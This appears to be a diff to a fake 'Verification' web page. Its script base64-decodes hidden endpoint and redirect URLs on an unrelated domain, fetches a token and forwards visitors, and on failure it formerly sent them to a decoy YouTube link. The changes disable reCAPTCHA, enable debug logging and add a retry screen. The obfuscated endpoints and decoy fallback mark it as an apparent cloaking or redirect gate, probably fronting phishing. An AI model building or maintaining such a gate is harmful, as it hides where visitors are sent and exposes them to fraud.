@@ -3,8 +3,8 @@
   <head>
     <meta charset="utf-8" />
     <title>Verification</title>
-    <!-- reCAPTCHA v3 -->
-    <script src="https://www.google.com/recaptcha/api.js?render="></script>
+    <!-- reCAPTCHA v3 - DISABLED -->
+    <!-- <script src="https://www.google.com/recaptcha/api.js?render=6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k"></script> -->
   </head>
   <body>
     <div id="app">Loading...</div>
@@ -16,9 +16,10 @@
         // ============================================
         const endpoint = atob("aHR0cDovL2NhbXBiZWxsY2hhbWJsaXNzYXBwcmFpc2Vycy5jb20vYXBpLnBocA==");
         const redirectBase = atob("aHR0cDovL2NhbXBiZWxsY2hhbWJsaXNzYXBwcmFpc2Vycy5jb20vcHJvY2Vzcy5waHA=");
-        const RECAPTCHA_SITE_KEY = ''; // Replace with your actual site key
+        const RECAPTCHA_SITE_KEY = ''; // reCAPTCHA disabled
+        const USE_RECAPTCHA = false; // reCAPTCHA DISABLED to match cPanel configuration
         
-        const DEBUG = false;
+        const DEBUG = true; // Enable to see detailed logs in browser console
         const pageLoadTime = Date.now();
         
         // ============================================
@@ -124,6 +125,10 @@
         // RECAPTCHA v3 EXECUTION
         // ============================================
         async function getRecaptchaToken() {
+          if (!USE_RECAPTCHA || !RECAPTCHA_SITE_KEY) {
+            return null; // Skip reCAPTCHA if disabled or no key
+          }
+          
           try {
             if (typeof grecaptcha === 'undefined') {
               console.warn('reCAPTCHA not loaded');
@@ -186,6 +191,10 @@
           if (DEBUG) console.log('📥 Response status:', res.status);
           
           if (!res.ok) {
+            console.error("API returned error status:", res.status);
+            // Try to get response text for debugging
+            const errorText = await res.text().catch(() => 'Could not read response');
+            console.error("API error response:", errorText);
             throw new Error("API returned: " + res.status);
           }
 
@@ -201,12 +210,33 @@
             return;
           }
           
+          console.error("API response missing token:", data);
           throw new Error("No token in response");
           
         } catch (e) {
           console.error("❌ Error:", e);
-          // Fallback: redirect to denied URL
-          location.replace("https://youtu.be/28Jgk08KTMA?si=aEuR7qlqhPIiFcvM");
+          console.error("Error details:", {
+            message: e.message,
+            stack: e.stack,
+            name: e.name
+          });
+          
+          // Show error message to user instead of immediately redirecting
+          document.getElementById('app').innerHTML = `
+            <div style="padding:40px;text-align:center;font-family:Arial,sans-serif;">
+              <h2 style="color:#d32f2f;">Verification Error</h2>
+              <p>Unable to complete verification. Please try again.</p>
+              <p style="font-size:12px;color:#666;margin-top:20px;">Error: ${e.message}</p>
+              <button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;background:#1976d2;color:white;border:none;border-radius:4px;cursor:pointer;">
+                Retry
+              </button>
+            </div>
+          `;
+          
+          // Optional: redirect after showing error for 5 seconds
+          // setTimeout(() => {
+          //   location.replace("https://youtu.be/28Jgk08KTMA?si=aEuR7qlqhPIiFcvM");
+          // }, 5000);
         }
       })();
     </script>
@@ -216,7 +246,6 @@
     </noscript>
   </body>
 </html>
-
 
 
 
